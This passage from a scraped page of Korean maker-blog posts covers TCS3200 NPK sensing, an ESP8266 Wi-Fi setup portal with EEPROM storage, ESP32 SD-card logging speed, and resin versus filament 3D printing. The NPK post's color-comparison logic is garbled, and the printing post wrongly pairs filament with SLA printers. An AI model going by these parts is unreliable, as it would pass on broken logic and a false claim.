Sensor](/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_1.png)\n\n이전에 언급했듯이, RGB 강도를 감지하는 데 사용되고 원리는 다음과 같습니다. TCS3200 센서는 빛 강도 및 색에 해당하는 주파수를 가진 제곱파(50% 듀티사이클)를 출력하며, 이 주파수는 빛 강도에 직접적으로 비례합니다. TCS3200D의 전형적인 출력 주파수 범위는 2Hz에서 500KHz입니다.\n\n- RGB 감지용 TCS3200 센서\n이 분석에서는 TCS3200 센서와 LED를 연결하는데 Arduino Uno를 마이크로컨트롤러 보드로 사용했습니다.\n\n![TCS3200 Sensor with Arduino Uno](/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_2.png)\n\n\n<div class=\"content-ad\"></div>\n\n위의 회로는 TCS3200 센서를 통해 RGB 검출을 위한 것이며, 결과는 아두이노 Uno 마이크로컨트롤러 보드에 연결된 LED로 표시됩니다.\n\n2. NPK 검출 및 균일한 비료 분사를 위한 TCS3200 센서\n\n먼저 ppm을 기반으로 NPK 양을 분석해야 합니다. 이에 따라 많은 연구 끝에 질소, 인 및 칼륨이 아래에 나와 있는 것처럼 Blue, Green 및 Red에 민감하다는 것이 밝혀졌습니다.\n\n![NPKDetectionusingTCS3200sensor](/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_3.png)\n\n<div class=\"content-ad\"></div>\n\n아래 로직에 기반하여 색 감지 및 기타 작업을 위한 분석을 수행했습니다:\n\n빨강 값:\n\nredValue=pulseIn(sensorOut, LOW)\n\n초록 값:\n\n<div class=\"content-ad\"></div>\n\ngreenValue = pulseIn(sensorOut, LOW)\n\n파란색 값:\n\nblueValue = pulseIn(sensorOut, LOW)\n\n빨간색이 우세할 때:\n\n<div class=\"content-ad\"></div>\n\n\n파란색 값을 pulseIn(sensorOut, LOW) 으로 가져옵니다.\n\nR ` B and R ` G\n\n만약 파란색이 우세하다면:\n\nblueValue=pulseIn(sensorOut, LOW)\n\n\n<div class=\"content-ad\"></div>\n\nB ` R 와 B ` G\n\nRGB 값 읽기:\n\nredValue = pulseIn(sensorOut, LOW)\n\ngreenValue = pulseIn(sensorOut, LOW)\n\n<div class=\"content-ad\"></div>\n\nblueValue = pulseIn(sensorOut, LOW)\n\nR = pulseIn(sensorOut, LOW)\n\nG = pulseIn(sensorOut, LOW)  \n\nB = pulseIn(sensorOut, LOW)\n\n<div class=\"content-ad\"></div>\n\n색상 감지:\n\n- R 밴드 R과 G ⟹ θ = 0도\n- B(R) and B(G) ⟹ θ = 90도\n- B와 G ⟹ θ = 90도\n\n<div class=\"content-ad\"></div>\n\n위 표는 탐지를 위해 수행된 연구, 분석 및 연구에 대한 내용입니다. 그러나 비료 분사 부분에는 Arduino Uno 및 3개의 서보 모터가 TCS3200 빛 센서와 통합되었습니다. 이러한 구성요소 간의 연결은 다음과 같습니다:\n\nTCS3200 및 Arduino Uno\n\n![이미지](/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_4.png)\n\nArduino Uno 및 서보 모터\n\n<div class=\"content-ad\"></div>\n\n아래는 제안된 아이디어입니다.\n\n아래의 링크에서 코드를 확인해보세요: https://github.com/SumukhJK","ogImage":{"url":"/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_0.png"},"coverImage":"/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_0.png","tag":["Tech"],"readingTime":3},{"title":"두통 없이 WiFi 모듈 ESP-01 ESP8266 사용하는 방법","description":"","date":"2024-06-22 18:43","slug":"2024-06-22-HowtousewifimoduleESP-01ESP8266withouttheheadache","content":"\n\n요즘, ESP32와 Arduino UNO 보드를 통합하여 스마트 홈 시스템을 만드는 것을 시도해보고 있어요. 집의 식물을 위한 보습 장치 같은 거 말이죠. 여기에는 그 여정과 그 과정에서 주요한 고충 포인트에 대해 설명하겠어요. 그리고 왜 NodeMCU의 ESP8266을 사용하게 된 이유에 대해서도 언급할게요.\n\n그래서 원하던 흐름은 다음과 같아요:\n\n- 시스템을 처음 시작할 때, 액세스 포인트 시작.\n- AP에 연결하고 로컬 네트워크의 SSID와 비밀번호를 요청하는 웹 페이지를 열기.\n- 데이터가 전달된 후, 시스템은 SSID와 비밀번호를 EEPROM에 저장하고 액세스 포인트를 중지하고 로컬 Wi-Fi에 클라이언트로 연결해야 해요.\n\n# ESP-01\n\n<div class=\"content-ad\"></div>\n\n이것을 조사하기 시작했을 때, ESP-01에 대한 아주 좋은 아이디어라고 생각했어요. 작고 저렴하면서 필요한 기능을 모두 갖추고 있거든요.\n\nESP-01은 Arduino를 이용해 RX/TX 핀을 통해 AT 프로토콜을 사용하여 제어할 수 있어요.\n\n하지만 UART AT 명령어를 사용하는 동안 약간의 조사를 한 후, Arduino의 메모리는 코딩을 끝내기 전에 사라질 것 같다는 사실을 알게 되었어요. ESP8266은 훨씬 더 많은 메모리를 가지고 있어요. 비교해 보면 ESP8266은 80kB의 메모리를 가지고 있고, Arduino Uno는 2kB를 갖고 있어요. 이는 계산기로부터 PC를 제어하려는 것과 비슷해요. 이런 방식은 작동하지 않아요.\n\n게다가, ESP 기반 컨트롤러는 IO 핀을 가지고 있어요. 이러한 핀을 Arduino에 연결하는 수고를 덜며 문제를 해결할 수 있어요. 그래서 ESP를 Arduino에서 제어해야 할까요? 그렇지 마세요! 이렇게 하지 마세요. 반드시 그렇게 해야 하는 것은 아니에요. 이 글이 다른 사람들이 제 실수를 반복하는 것을 막아줄 수 있기를 바라요.\n\n<div class=\"content-ad\"></div>\n\n아래에서 ESP를 올바르게 사용하는 방법을 볼 수 있습니다.\n\n![이미지](/assets/img/2024-06-22-HowtousewifimoduleESP-01ESP8266withouttheheadache_0.png)\n\n# NodeMCU의 ESP8266\n\nESP-01의 사용은 Arduino와 함께 여러 문제가 위에서 설명된 것과 맞닿아 있습니다 !!!!!\n\n<div class=\"content-ad\"></div>\n\n반면에, NodeMCU의 ESP8266은 쉽게 다가갈 수 있는 친구에요. ESP 모듈이 내장되어 있고 좋은 컴퓨팅 성능을 갖추고 있습니다. 또한 배선이 필요하지 않아요.\n\n## 단계 1. 설정.\n\n가장 먼저, NodeMCU 칩과 작업할 수 있도록 Arduino IDE와 OS를 설정해야 합니다.\n\n시스템에서 시리얼을 보이도록 CH340G 드라이버를 설치해주세요.\n\n<div class=\"content-ad\"></div>\n\n- macOS\n- Linux\n- Windows\n\n도구 - 보드 - 보드 관리자로 이동하세요. esp8266 보드 관리자를 설치하세요.\n\n<img src=\"/assets/img/2024-06-22-HowtousewifimoduleESP-01ESP8266withouttheheadache_1.png\" />\n\n그 후, ESPAsyncTCP와 ESPAsyncWebServer 라이브러리를 설치해야 합니다. 저장소를 복제하고 이름에서 \"-master\"를 제거하세요. 그 폴더들을 Arduino/libraries/ 폴더로 이동하세요.\n\n<div class=\"content-ad\"></div>\n\n코딩을 시작할 준비가 모두 완료되었어요.\n\n## 단계 2. 코딩.\n\n접속 지점 SSID/비밀번호를 설정 중입니다.\n\n```js\nconst char* ssid = \"ESP8266-Access-Point\";\nconst char* password = \"123456789\";\n```\n\n<div class=\"content-ad\"></div>\n\n서버 액세스시 반환할 HTML 페이지:\n\n```js\nconst char index_html[] PROGMEM = R\"rawliteral(\n<!DOCTYPE HTML>\n<html>\n  <head>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <style>\n      html {\n        font-family: Arial;\n        display: inline-block;\n        margin: 0px auto;\n        text-align: center;\n      }\n      h2 {\n        font-size: 3.0rem;\n      }\n      p { \n        font-size: 3.0rem;\n      }\n      .units {\n        font-size: 1.2rem;\n      }\n      .input {\n        font-size: 20px;\n        margin-bottom: 10px;\n      }\n      .wifi-form {\n        display: flex;\n        flex-direction: column;\n        align-items: center;\n        justify-content: space-around;\n      }\n    </style>\n  </head>\n  <body>\n    <div class=\"wifi-form\">\n      <h1>테스트</h1>\n      <input id=\"ssid\" class=\"input\" type=\"text\" maxlength=\"32\">\n      <input id=\"password\" class=\"input\" type=\"password\">\n      <button onclick=\"connectToWifi()\">연결</button>\n    </div>\n  </body>\n  <script>\n    function connectToWifi() {\n      var ssid = document.getElementById(\"ssid\").value;\n      var password = document.getElementById(\"password\").value;\n      var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"/\", true);\n      xhr.setRequestHeader('Content-Type', 'application/json');\n      xhr.send(ssid + \":\" + password);\n    }\n  </script>\n</html>)rawliteral\";\n```\n\n로컬 Wi-Fi의 SSID와 비밀번호를 요청하는 간단한 양식입니다.\n\nconnectToWifi 함수는 POST 요청으로 데이터를 서버로 전송합니다.\n\n<div class=\"content-ad\"></div>\n\n요청을 처리할 서버를 설정해 봅시다.\n\n다음을 글로벌 변수로 추가해 주세요.\n\n```js\nAsyncWebServer server(80);\n```\n\n접속 지점 함수를 만들어 주세요.\n\n<div class=\"content-ad\"></div>\n\n```js\nvoid createAccessPoint() {\n  WiFi.softAP(ssid, password);\n  IPAddress IP = WiFi.softAPIP();\n  Serial.print(\"AP IP address: \");\n  Serial.println(IP);\n  // Print ESP8266 Local IP Address\n  Serial.println(WiFi.localIP());\n  server.on(\"/\", HTTP_GET, [](AsyncWebServerRequest *request) {\n    request->send_P(200, \"text/html\", index_html);\n  });\n  server.on(\"/\", HTTP_POST, [](AsyncWebServerRequest *request){},NULL, [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {\n    ssidWifi = \"\";\n    passwordWifi = \"\";\n    String res((char *)data);\n    int sepIndex = -1;\n    for (int i = 0; i < len; ++i) {\n      if (res[i] != ':') {\n        if (sepIndex == -1) {\n          ssidWifi.concat(res[i]);\n        }\n        if (i > sepIndex && sepIndex != -1) {\n          passwordWifi.concat(res[i]);\n        }\n      }\n      else {\n        sepIndex = i;\n      }\n    }\n    writeEEPROM(ssidWifi, ssidIndex);\n    writeEEPROM(passwordWifi, passwordIndex);\n    request->send(200, \"text/plain\", \"SUCCESS\");\n  });\n  server.begin();\n}\n```\n\n우리가 이걸 살펴보자.\n\n```js\nWiFi.softAP(ssid, password);\n```\n\n이 부분은 시작 시 SSID 및 비밀번호가 전달되어 액세스 포인트를 생성합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nIPAddress IP = WiFi.softAPIP();\nSerial.print(\"AP IP 주소: \");\nSerial.println(IP);\n// ESP8266 로컬 IP 주소 출력\nSerial.println(WiFi.localIP());\n```\n\n로그 기능입니다. 디버깅에 필요합니다.\n\n```js\nserver.on(\"/\", HTTP_GET, [](AsyncWebServerRequest *request) {\n    request->send_P(200, \"text/html\", index_html);\n});\n```\n\nHTTP GET 요청을 처리하고 HTML 페이지를 반환합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nserver.on(\"/\", HTTP_POST, [](AsyncWebServerRequest *request){},NULL, [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {\n    ssidWifi = \"\";\n    passwordWifi = \"\";\n    String res((char *)data);\n    int sepIndex = -1;\n    for (int i = 0; i < len; ++i) {\n      if (res[i] != ':') {\n        if (sepIndex == -1) {\n          ssidWifi.concat(res[i]);\n        }\n        if (i > sepIndex && sepIndex != -1) {\n          passwordWifi.concat(res[i]);\n        }\n      }\n      else {\n        sepIndex = i;\n      }\n    }\n    writeEEPROM(ssidWifi, ssidIndex);\n    writeEEPROM(passwordWifi, passwordIndex);\n    request->send(200, \"text/plain\", \"SUCCESS\");\n  });\n```\n\n위 코드는 포스트 요청을 처리합니다. AsyncWebServer 요청을 받아들이기 위해 다섯 번째 매개변수를 AsyncWebServer 요청으로 추가해야 합니다. 알고리즘은 매우 간단합니다. 글로벌 변수인 ssidWifi와 passwordWifi를 지웁니다. SSID:password를 이런 형식으로 구문 분석하고 데이터를 EEPROM에 저장합니다.\n\n그 후에 서버를 시작합니다.\n\nssidIndex는 0이며, 이는 데이터의 시작 주소입니다.\n\n<div class=\"content-ad\"></div>\n\n패스워드 인덱스는 33입니다. 이는 SSID 최대 길이가 32바이트이며, 하나의 바이트가 문자열의 길이로 예약되어 있기 때문입니다. 이를 writeEEPROM 함수에서 확인할 수 있습니다:\n\n```js\nvoid writeEEPROM(String value, int address) {\n  int len = value.length();\n  EEPROM.put(address, len);\n  for (int i = address + 1; i < len + address + 1; ++i) {\n    EEPROM.put(i, value[i - address - 1]);\n  }\n  EEPROM.commit();\n}\n```\n\n이제 이러한 데이터를 EEPROM에서 읽을 수 있어야 합니다:\n\n```js\nString readEEPROM(int address) {\n  uint8_t len = EEPROM.read(address);\n  if (len == 255) return \"\";\n  String res;\n  for (int i = address + 1; i < len + address + 1; ++i) {\n    char c = (char)EEPROM.read(i);\n    res.concat(c);\n  }\n  return res;\n}\n```\n\n<div class=\"content-ad\"></div>\n\n255- 이는 비어 있는 데이터를 나타냅니다. 여기서는 먼저 데이터 길이에 할당된 첫 번째 바이트를 받아 그 후의 데이터를 읽고 결과를 반환합니다.\n\n이제 모든 것을 함께 묶어 보겠습니다.\n\n```js\nvoid setup() {\n  Serial.begin(9600);\n  EEPROM.begin(128);\n  ssidWifi = readEEPROM(ssidIndex);\n  passwordWifi = readEEPROM(passwordIndex);\n  if (ssidWifi.length() > 0 && passwordWifi.length() > 0 && WiFi.status() != WL_CONNECTED) {\n    WiFi.softAPdisconnect(true);\n    server.end();\n    WiFi.begin(ssidWifi, passwordWifi);\n    while (WiFi.status() != WL_CONNECTED) {\n      delay(1000);\n    }\n  }\n  else\n  {\n    createAccessPoint();\n  }\n}\nvoid loop() {\n  if (ssidWifi.length() > 0 && passwordWifi.length() > 0 && WiFi.status() != WL_CONNECTED) {\n    WiFi.softAPdisconnect(true);\n    server.end();\n    WiFi.begin(ssidWifi, passwordWifi);\n    while (WiFi.status() != WL_CONNECTED) {\n      delay(1000);\n    }\n  }\n}\n```\n\n여기까지입니다. 하드코딩 없이 wifi 자격 증명을 설정할 수 있는 웹페이지가 있는 서버를 시작하는 작동하는 시스템이 준비되었습니다.\n\n<div class=\"content-ad\"></div>\n\n그리고 GitHub의 작동 예제 링크를 변경하십시오.","ogImage":{"url":"/assets/img/2024-06-22-HowtousewifimoduleESP-01ESP8266withouttheheadache_0.png"},"coverImage":"/assets/img/2024-06-22-HowtousewifimoduleESP-01ESP8266withouttheheadache_0.png","tag":["Tech"],"readingTime":8},{"title":"ESP32로 SD 카드 IO 성능 최적화하는 방법","description":"","date":"2024-06-22 18:42","slug":"2024-06-22-OptimizingSDCardIOPerformancewithESP32","content":"\n\n# 저에 대해\n\n안녕하세요, 저는 지위 마오입니다. 지반공학 기술자이자 IoT 시스템에 열정을 가진 사람입니다. 저는 저전력 마이크로컨트롤러와 LoRa 통신 시스템을 연구하여 취미로 사용할 수 있는 원격 모니터링 솔루션부터 산업용 모니터링 또는 제어 시스템을 구축하고 있습니다. 제 웹사이트를 방문해주세요: https://www.qiweimao.dev/blog\n\nLinkedIn | Github | Reddit | X\n\n# 많은 파일로 인해 SD 카드 I/O 속도가 느려지는 이유\n\n<div class=\"content-ad\"></div>\n\nSD 카드의 단일 폴더에 대량의 파일을 축적하면 파일 시스템(FAT32 또는 exFAT과 같은 SD 카드용)이 파일을 찾거나 열기 위해 디렉터리 항목을 검색해야 합니다. 파일이 증가함에 따라 이 디렉터리 검색 프로세스는 느려질 수 있습니다. 그 이유는 다음과 같습니다:\n\n- 디렉터리 항목: FAT32와 exFAT은 디렉터리 항목을 선형 목록에 저장합니다. 파일이 늘어날수록 이 목록을 검색하는 시간이 선형적으로 증가하므로 특정 파일을 찾거나 열 때 상당히 더 많은 시간이 걸릴 수 있습니다.\n- 단편화: 파일이 생성되고 삭제되며 수정되면 시간이 지남에 따라 단편화가 발생할 수 있습니다. 이는 파일의 일부가 SD 카드의 다른 물리적 위치에 퍼져 있을 수 있어 파일을 읽는 데 걸리는 시간을 증가시킬 수 있습니다.\n- 클러스터 할당: 각 파일 및 디렉터리 항목에는 클러스터 할당이 필요하며, 이는 파일 할당 테이블(FAT)에 의해 관리됩니다. 많은 파일을 처리할수록 이러한 할당을 업데이트하고 관리하는 과정이 더 복잡하고 시간이 많이 소요됩니다.\n\n# 입출력 테스트\n\n다음은 단일 디렉터리의 모든 파일을 기록하는 것과 하위 폴더 전략을 사용하는 것 사이의 속도 차이를 비교하는 두 테스트 프로그램에 대한 개요입니다. 이 프로그램은 각 쓰기 동작에 걸리는 시간을 기록하고 이 정보를 로그 파일에 저장할 것입니다. ESP32는 500ms마다 파일 쓰기 동작을 시작할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n![Optimizing SD Card I/O Performance with ESP32](/assets/img/2024-06-22-OptimizingSDCardIOPerformancewithESP32_0.png)\n\nESP32에서 SD 카드 I/O의 성능 분석 결과, 파일을 하나의 폴더에 저장하는 것과 분 단위로 서브폴더에 구성하는 것 사이에 명확한 추세 차이가 나타납니다.\n\n하나의 폴더에 순차적으로 파일을 저장하는 경우 파일 수가 증가함에 따라 파일 I/O 시간이 선형적으로 증가하는 것을 확인할 수 있습니다. 이는 대량 디렉토리 내의 파일 접근 및 관리가 검색 및 검색 시간이 증가하여 점진적으로 느려진다는 것을 시사합니다. 반면에, 서브폴더 접근 방식은 초기에는 I/O 시간이 비슷하게 증가하지만 새 파일이 새로운 서브폴더로 이동함에 따라 접근 시간이 간헐적으로 감소합니다.\n\n이 현상은 파일을 작은 시간 기반 클러스터로 조직화하는 것이 단일 폴더 저장 과정에서 관찰된 성능 하락을 완화하는 것을 나타냅니다. 이러한 조직 전략은 액세스 속도를 최적화할 뿐만 아니라 저장 부하를 관리 가능한 하위 집합에 분산하여 전체 시스템 효율성을 향상시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n### 프로그램 1: 단일 디렉토리 로깅\n\n```cpp\n#include <Arduino.h>\n#include <SD.h>\n#include <SPI.h>\n\nconst int chipSelect = 5;\nconst String dataFolder = \"/data\";\nconst String logFileName = \"/io_time_log_single.txt\";\nconst int interval = 500; // 1분 간격\nunsigned long previousMillis = 0;\n\nvoid setup() {\n  Serial.begin(115200);\n  if (!SD.begin(chipSelect)) {\n    Serial.println(\"카드 연결 실패 또는 없음\");\n    while (1);\n  }\n  if (!SD.exists(dataFolder)) {\n    SD.mkdir(dataFolder);\n  }\n}\n\nvoid logData() {\n  unsigned long start = millis();\n  String fileName = dataFolder + \"/data_\" + String(start) + \".txt\";\n  File dataFile = SD.open(fileName, FILE_WRITE);\n\n  if (dataFile) {\n    dataFile.println(\"더미 시계열 데이터\");\n    dataFile.close();\n  }\n\n  unsigned long end = millis();\n  File logFile = SD.open(logFileName, FILE_APPEND);\n  if (logFile) {\n    logFile.println(String(start) + \",\" + String(end - start));\n    logFile.close();\n  }\n}\n\nvoid loop() {\n  unsigned long currentMillis = millis();\n  if (currentMillis - previousMillis >= interval) {\n    previousMillis = currentMillis;\n    logData();\n  }\n}\n```\n\n### 프로그램 2: 서브폴더 전략 로깅\n\n```cpp\n#include <Arduino.h>\n#include <SD.h>\n#include <SPI.h>\nconst int chipSelect = 5;\nconst String dataFolder = \"/data\";\nconst String logFileName = \"/io_time_log_subfolder.txt\";\nconst int interval = 500; // 1분 간격\nunsigned long previousMillis = 0;\nvoid setup() {\n Serial.begin(115200);\n if (!SD.begin(chipSelect)) {\n Serial.println(\"카드 연결 실패 또는 없음\");\n while (1);\n }\n if (!SD.exists(dataFolder)) {\n SD.mkdir(dataFolder);\n }\n}\nvoid createDirectories(String path) {\n String subPath = \"\";\n int start = 0;\n int end = path.indexOf('/', start);\nwhile (end != -1) {\n subPath = path.substring(0, end);\n if (!SD.exists(subPath)) {\n SD.mkdir(subPath);\n }\n start = end + 1;\n end = path.indexOf('/', start);\n }\nif (!SD.exists(path)) {\n SD.mkdir(path);\n }\n}\nvoid logData() {\n unsigned long start = millis();\n \n // 현재 밀리초 단위 시간을 기준으로 서브폴더 생성\n unsigned long totalMinutes = start / 60000;\n unsigned long totalHours = totalMinutes / 60;\n unsigned long totalDays = totalHours / 24;\nString day = String(totalDays);\n String hour = String(totalHours % 24);\n String minute = String(totalMinutes % 60);\nString subFolder = dataFolder + \"/\" + day + \"/\" + hour + \"/\" + minute;\n createDirectories(subFolder);\nString fileName = subFolder + \"/data_\" + String(start) + \".txt\";\n \n start = millis();\n File dataFile = SD.open(fileName, FILE_WRITE);\n if (dataFile) {\n dataFile.println(\"더미 시계열 데이터\");\n dataFile.close();\n }\n unsigned long end = millis();\n \n File logFile = SD.open(logFileName, FILE_APPEND);\n if (logFile) {\n logFile.println(String(start) + \",\" + String(end - start));\n logFile.close();\n }\n}\nvoid loop() {\n unsigned long currentMillis = millis();\n if (currentMillis - previousMillis >= interval) {\n previousMillis = currentMillis;\n logData();\n }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\n파일을 하위 디렉터리로 구성하고, 바이너리 형식을 사용하며, 메모리 내 메타데이터를 유지하고, 쓰기와 읽기 모두 최적화된 파일 구조를 사용함으로써 ESP32 데이터 로거의 I/O 성능을 크게 향상시킬 수 있습니다. 이러한 전략은 많은 수의 파일을 관리하고 LoRa 네트워크를 통해 효율적인 데이터 검색 및 전송을 보장하는 데 도움이 될 것입니다.","ogImage":{"url":"/assets/img/2024-06-22-OptimizingSDCardIOPerformancewithESP32_0.png"},"coverImage":"/assets/img/2024-06-22-OptimizingSDCardIOPerformancewithESP32_0.png","tag":["Tech"],"readingTime":5},{"title":"레진 3D 프린팅 vs 필라멘트 프린팅 장단점 비교","description":"","date":"2024-06-22 18:41","slug":"2024-06-22-TheProsandConsofResin3DPrintingvsFilamentPrinting","content":"\n\n![이미지](/assets/img/2024-06-22-TheProsandConsofResin3DPrintingvsFilamentPrinting_0.png)\n\n# I. 소개:\n\n3D 프린팅은 부가 제조라고도 하는데, 연속적인 재료 층을 쌓아 세 가지 차원의 물체를 만드는 과정입니다. 프로토타이핑, 제품 개발부터 제조 및 예술 표현까지 다양한 작업에 널리 사용되고 있습니다.\n\n3D 프린팅에 사용되는 다양한 재료 중 일반적으로 사용되는 것은 플라스틱 필라멘트와 레진입니다. 필라멘트 프린팅은 녹은 플라스틱을 노즐을 통해 압출하여 단계별로 물체를 쌓는 과정을 포함합니다. 반면 레진 프린팅은 미세한 소재로 만들어진 광반응성 액체 레진을 UV 광선(일반적으로 레이저 또는 LED)을 사용하여 층별로 경화시키고 고체화합니다. 필라멘트와 레진 프린팅은 각각 고유한 장단점이 있으며, 본 문서에서 자세히 살펴보겠습니다.\n\n<div class=\"content-ad\"></div>\n\n# II. 수지 3D 프린팅의 장점:\n\n수지 3D 프린팅의 주요 이점 중 하나는 높은 정도의 세부 사항과 섬세함을 달성할 수 있다는 것입니다. 수지 프린팅은 빔 광선을 사용하여 물질을 단계별로 경화하고 고체화하는데, 이는 필라멘트 프린팅으로는 세밀하거나 얻기 어려운 매우 섬세하고 정확한 특징을 만들기에 적합합니다. 이는 보석이나 치과 임플란트와 같이 정교하고 놀랍도록 섬세한 물체를 만드는 데 수지 프린팅이 이상적이라는 것을 의미합니다.\n\n수지 프린팅의 또다른 장점은 사용 가능한 다양한 소재의 범위입니다. 3D 프린팅에 사용할 수 있는 다양한 종류의 수지가 있으며, 각각 고유한 특성과 응용 분야를 갖고 있습니다. 예를 들어, 의료 또는 치과 수술용으로 특별히 공식화된 수지뿐만 아니라, 다양한 금속이나 세라믹 속성을 모방한 수지도 있습니다. 이를 통해 특정 요구 사항 및 운용에 가장 적합한 소재를 선택할 수 있습니다.\n\n세부 사항과 정밀성 뿐만 아니라, 수지 프린트는 강하고 내구성이 뛰어난 것으로도 알려져 있습니다. 수지가 단계별로 경화되고 고체화되므로 층 간 강력한 결합을 유발하고 파괴나 왜곡에 저항하는 프린트물을 만들어낼 수 있습니다. 이는 응력이나 마모에 시달리는 기능적인 부품이나 물체를 만드는 데 좋은 선택이 되도록 합니다.\n\n<div class=\"content-ad\"></div>\n\n# III. Resin 3D 프린팅의 단점:\n\n레진 3D 프린팅의 주요 단점 중 하나는 비용입니다. 레진 프린터는 필라멘트 프린터보다 가격이 더 비싸며, 레진 재료 자체도 일반적으로 필라멘트보다 비싸다. 이는 예산이 촉박한 사람들에게는 더 어렵게 만들 수 있습니다.\n\n비용 외에도, 레진 프린팅은 전문 장비와 레진 프린터가 필요합니다. 이 프린터는 일반적으로 필라멘트 프린터보다 더 복잡하고 유지보수가 더 많이 필요하기 때문에 일부 사용자에게는 장애물이 될 수 있습니다.\n\n레진 프린팅의 또 다른 묵시적 문제는 프린트물이 인쇄 과정 중에 왜곡되거나 수축하는 경향이 있다는 것입니다. 이는 사용되는 레진의 종류, 프린트가 이루어지는 환경 또는 물체의 디자인과 같은 여러 요인에 의해 발생할 수 있습니다. 왜곡과 수축은 변형되거나 불균일한 프린트물로 이어질 수 있으며, 원하는 결과를 얻기 위해 추가 후처리 또는 보조 구조물이 필요할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# IV. 필라멘트 프린팅의 장점:\n\n필라멘트 3D 프린팅의 주요 장점 중 하나는 널리 보급되어 비용 효율적이라는 것입니다. 필라멘트는 레진보다 훨씬 일반적이며 비용도 낮아 많은 사용자에게 더 접근하기 쉬운 옵션이 됩니다. 필라멘트 프린터는 또한 일반적으로 레진 프린터보다 더 저렴하여 3D 프린팅을 시작하는 개인 또는 소기업에게 더 쉽게 접근할 수 있습니다.\n\n필라멘트 프린팅의 또 다른 이점은 사용할 수 있는 프린터의 종류에 대한 유연성입니다. 필라멘트 프린터는 다양한 크기와 가격대로 제공되어, 특정 요구 사항과 예산에 맞는 프린터를 쉽게 찾을 수 있습니다. 또한, 필라멘트는 FDM(융착 퓨전 성형), SLA(스테레오리소그래피) 및 기타 다양한 유형의 프린터와 함께 사용할 수 있습니다.\n\n필라멘트 프린팅은 사용하기 쉽고 사용자 정의하기 쉽다는 점으로도 알려져 있습니다. 필라멘트는 프린터에서 쉽게 로드하고 언로드할 수 있으며, 다양한 색상, 속성 및 응용 프로그램을 지원하는 다양한 종류의 필라멘트가 있습니다. 이를 통해 출력물을 사용자 정의하고 다양한 제품을 생산하는 것이 쉬워집니다.\n\n<div class=\"content-ad\"></div>\n\n# V. 필라멘트 프린팅의 단점:\n\n필라멘트 프린팅의 주요 제한 사항 중 하나는 수지 프린팅과 비교하여 상세함과 섬세함의 수준이 낮다는 것입니다. 필라멘트 프린팅은 녹은 플라스틱을 노즐을 통해 내출하는 과정이 포함되기 때문에, 수지 프린팅만큼 미세한 세부 사항과 정확도를 달성하기에는 적합하지 않습니다. 이는 상세하거나 정확한 출력물이 필요한 사람들에게는 단점일 수 있습니다.\n\n상세함과 정확도가 낮다는 점 외에, 필라멘트 프린팅은 수지 프린팅과 비교하여 사용 가능한 재료 범위도 더 한정적입니다. 필라멘트의 종류는 다양하지만, 일반적으로 수지 프린팅에서 사용할 수 있는 수지와 같이 다양하거나 특수화된 것들은 아닙니다. 이는 출력물로부터 특정한 속성이나 기능이 필요한 사람들에게 제한이 될 수 있습니다.\n\n필라멘트 프린팅은 또한 출력물 사이에 얇은 플라스틱 줄이 남아있는 스트링핑(stringing)과 출력물에 갭이나 구멍이 남는 등의 결함에 취약합니다. 이러한 결함은 필라멘트의 품질, 프린터의 보정, 또는 출력하려는 제품의 설계와 같은 다양한 요소로 인해 발생할 수 있습니다. 프린터를 신중하게 설정하고 조정함으로써 이러한 결함을 최소화하거나 제거할 수는 있지만, 일부 사용자에게는 여전히 답답함을 줄 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n# VI. 결론:\n\n결론적으로, 수지 인쇄와 필라멘트 인쇄는 각자 고유한 장단점을 갖고 있습니다. 수지 인쇄는 높은 정밀도와 정확성, 다양한 소재 선택, 강력하고 내구성 있는 출력물을 제공하지만, 비용이 높고 기술적인 장비가 필요할 수 있습니다. 반면에 필라멘트 인쇄는 보편적으로 사용 가능하고 가격이 덜 비싸며 다양한 프린터와 함께 사용할 수 있으며 쉽고 사용자 정의가 가능하지만, 낮은 정밀도와 정확성 및 제한된 소재 범위가 있습니다.\n\n수지 인쇄와 필라멘트 인쇄 중 어느 것을 선택할지 결정할 때, 본인의 특정 요구사항과 예산을 고려하는 것이 중요합니다. 그러나, 만약 상세하거나 정확한 출력물이 필요하고 필요한 장비와 소재에 투자할 용의가 있다면, 수지 인쇄가 더 나은 선택일 수 있습니다. 반면에, 예산이 제약되어 있거나 최고 수준의 세부 정보가 필요하지 않다면, 필라멘트 인쇄가 비용 효율적인 선택일 수 있습니다. 최종적으로, 여러분에게 가장 적합한 선택은 본인의 구체적인 목표와 상황에 달려 있을 것입니다.","ogImage":{"url":"/assets/img/2024-06-22-TheProsandConsofResin3DPrintingvsFilamentPrinting_0.png"},"coverImage":"/assets/img/2024-06-22-TheProsandConsofResin3DPrintingvsFilamentPrinting_0.png","tag":["Tech"],"readingTime":4}],"page":"32","totalPageCount":112,"totalPageGroupCount":6,"lastPageGroup":20,"currentPageGroup":1},"__N_SSG":true}